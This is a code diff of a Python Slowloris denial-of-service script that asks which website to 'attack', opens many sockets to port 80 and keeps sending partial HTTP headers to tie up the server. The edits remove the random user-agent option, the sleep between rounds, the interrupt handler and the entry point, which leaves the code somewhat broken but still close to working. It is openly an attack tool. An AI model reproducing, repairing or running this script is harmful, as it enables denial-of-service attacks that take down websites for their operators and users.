@@ -1,5 +1,9 @@
-import socket
+#!/usr/bin/env python3
+import logging
 import random
+import socket
+import ssl
+import sys
 import time
 
 
@@ -12,19 +16,16 @@ def init_socket(ip):
     s.connect((ip, 80))
 
     s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-    if args.randuseragent:
-        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
-    else:
-        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
+    s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
     s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+
     return s
 
 
-def main():
+def main_function():
     ip = input("Enter the website you want to attack on: ")
-    socket_count = int(input("Enter the number of sockets you want to create: ))
+    socket_count = int(input("Enter the number of sockets you want to create: "))
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
-
     logging.info("Creating sockets...")
     for i in range(socket_count):
         try:
@@ -33,7 +34,6 @@ def main():
         except socket.error:
             break
         list_of_sockets.append(s)
-
     while True:
         try:
             logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
@@ -43,7 +43,7 @@ def main():
                 except socket.error:
                     list_of_sockets.remove(s)
 
-            for _ in range(socket_count - len(list_of_sockets)):
+            for j in range(socket_count - len(list_of_sockets)):
                 logging.debug("Recreating socket...")
                 try:
                     s = init_socket(ip)
@@ -51,11 +51,3 @@ def main():
                         list_of_sockets.append(s)
                 except socket.error:
                     break
-            time.sleep(15)
-
-        except (KeyboardInterrupt, SystemExit):
-            print("\nStopping Slowloris...")
-            break
-
-if __name__ == "__main__":
-    main()
